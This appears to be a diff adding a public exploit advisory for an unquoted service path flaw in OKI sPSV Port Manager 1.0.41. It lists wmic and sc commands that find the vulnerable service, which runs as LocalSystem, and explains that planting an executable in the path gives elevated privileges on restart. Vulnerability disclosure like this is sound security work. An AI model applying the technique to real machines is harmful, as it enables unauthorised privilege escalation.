@@ -1,0 +1,39 @@
+# Exploit Title: OKI sPSV Port Manager 1.0.41 - 'sPSVOpLclSrv' Unquoted Service Path
+# Date: 2020-11-08
+# Exploit Author: Julio Aviña
+# Vendor Homepage: https://www.oki.com/
+# Software Link: https://www.oki.com/mx/printing/download/sPSV_010041_2_270910.exe
+# Software Version: 1.0.41
+# File Version: 1.4.2.0
+# Tested on: Windows 10 Pro x64 es
+# Vulnerability Type: Unquoted Service Path
+
+
+# 1. To find the unquoted service path vulnerability
+
+C:\>wmic service where 'name like "%sPSVOpLclSrv%"' get displayname, pathname, startmode, startname
+
+DisplayName            PathName                                                                           StartMode  StartName
+OKI sPSV Port Manager  C:\Program Files\Okidata\smart PrintSuperVision\xml\ComApi\extend3\portmgrsrv.exe  Auto       LocalSystem
+
+# 2. To check service info:
+
+C:\>sc qc "sPSVOpLclSrv"
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: sPSVOpLclSrv
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\Okidata\smart PrintSuperVision\xml\ComApi\extend3\portmgrsrv.exe
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : OKI sPSV Port Manager
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+
+# 3. Exploit:
+
+A successful attempt to exploit this vulnerability requires the attacker to insert an executable file into the service path undetected by the OS or some security application.
+When restarting the service or the system, the inserted executable will run with elevated privileges.
